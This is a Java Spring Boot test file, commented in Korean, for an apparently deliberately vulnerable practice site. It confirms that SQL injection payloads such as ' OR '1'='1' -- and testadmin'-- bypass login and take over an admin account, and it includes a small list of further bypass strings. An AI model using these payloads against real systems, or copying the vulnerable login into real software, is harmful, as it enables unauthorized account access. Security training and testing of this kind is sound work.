package com.vulsite.vulnerability;

import com.vulsite.entity.User;
import com.vulsite.repository.UserRepository;
import com.vulsite.service.UserService;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.transaction.annotation.Transactional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * A담당 - 취약점 #1: SQL Injection 테스트
 *
 * 테스트 시나리오:
 * 1. 정상 로그인 테스트
 * 2. SQL Injection 인증 우회
 * 3. SQL Injection 관리자 계정 탈취
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@AutoConfigureMockMvc
@Transactional
class SqlInjectionTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private UserService userService;

    private User testAdmin;
    private User testUser;

    @BeforeEach
    void setUp() {
        // 기존 DataInitializer가 생성한 데이터 외에 테스트용 사용자 추가
        if (userRepository.findByUsername("testadmin").isEmpty()) {
            testAdmin = new User("testadmin", "testpass123", "testadmin@test.com", "테스트관리자");
            testAdmin.setAdmin(true);
            userRepository.save(testAdmin);
        }

        if (userRepository.findByUsername("testuser").isEmpty()) {
            testUser = new User("testuser", "userpass123", "testuser@test.com", "테스트사용자");
            userRepository.save(testUser);
        }
    }

    @Test
    @DisplayName("[정상] 올바른 계정으로 로그인 성공")
    void login_withValidCredentials_shouldSucceed() throws Exception {
        mockMvc.perform(post("/user/login")
                        .param("username", "testadmin")
                        .param("password", "testpass123"))
                .andExpect(status().is3xxRedirection())
                .andExpect(redirectedUrl("/"));
    }

    @Test
    @DisplayName("[정상] 잘못된 비밀번호로 로그인 실패")
    void login_withInvalidPassword_shouldFail() throws Exception {
        mockMvc.perform(post("/user/login")
                        .param("username", "testadmin")
                        .param("password", "wrongpassword"))
                .andExpect(status().isOk())
                .andExpect(model().attributeExists("error"));
    }

    @Test
    @DisplayName("[취약점 #1] SQL Injection - ' OR '1'='1' -- 로 인증 우회")
    void sqlInjection_withOrPayload_shouldBypassAuth() throws Exception {
        // 공격 페이로드: ' OR '1'='1' --
        // 생성되는 쿼리: SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'

        mockMvc.perform(post("/user/login")
                        .param("username", "' OR '1'='1' --")
                        .param("password", "anything"))
                .andExpect(status().is3xxRedirection())
                .andExpect(redirectedUrl("/"));

        System.out.println("[취약점 확인] SQL Injection 인증 우회 성공");
    }

    @Test
    @DisplayName("[취약점 #1] SQL Injection - admin'-- 로 관리자 계정 탈취")
    void sqlInjection_withCommentPayload_shouldAccessAdmin() throws Exception {
        // 공격 페이로드: testadmin'--
        // 생성되는 쿼리: SELECT * FROM users WHERE username = 'testadmin'--' AND password = '...'
        // 주석 처리로 비밀번호 검증 우회

        mockMvc.perform(post("/user/login")
                        .param("username", "testadmin'--")
                        .param("password", "anything"))
                .andExpect(status().is3xxRedirection())
                .andExpect(redirectedUrl("/"));

        System.out.println("[취약점 확인] SQL Injection으로 관리자 계정 탈취 성공");
    }

    @Test
    @DisplayName("[취약점 #1] Service 레이어 - SQL Injection 직접 검증")
    void sqlInjection_atServiceLayer_shouldReturnUser() {
        // 정상 로그인 확인
        User normalLogin = userService.loginVulnerable("testadmin", "testpass123");
        assertThat(normalLogin).isNotNull();
        assertThat(normalLogin.getUsername()).isEqualTo("testadmin");

        // SQL Injection으로 인증 우회
        User hackedLogin = userService.loginVulnerable("' OR '1'='1' --", "doesntmatter");
        assertThat(hackedLogin).isNotNull();

        System.out.println("[취약점 확인] SQL Injection으로 획득한 계정: " + hackedLogin.getUsername());
    }

    @Test
    @DisplayName("[취약점 #1] SQL Injection - 특수문자 페이로드 테스트")
    void sqlInjection_withSpecialCharacters_shouldBypass() throws Exception {
        // 다양한 SQL Injection 페이로드 테스트
        String[] payloads = {
            "' OR ''='",
            "' OR 1=1 --",
            "admin' #",
            "' OR 'x'='x"
        };

        for (String payload : payloads) {
            try {
                mockMvc.perform(post("/user/login")
                                .param("username", payload)
                                .param("password", "test"))
                        .andExpect(status().is3xxRedirection());
                System.out.println("[성공] 페이로드: " + payload);
            } catch (AssertionError e) {
                System.out.println("[실패] 페이로드: " + payload);
            }
        }
    }
}
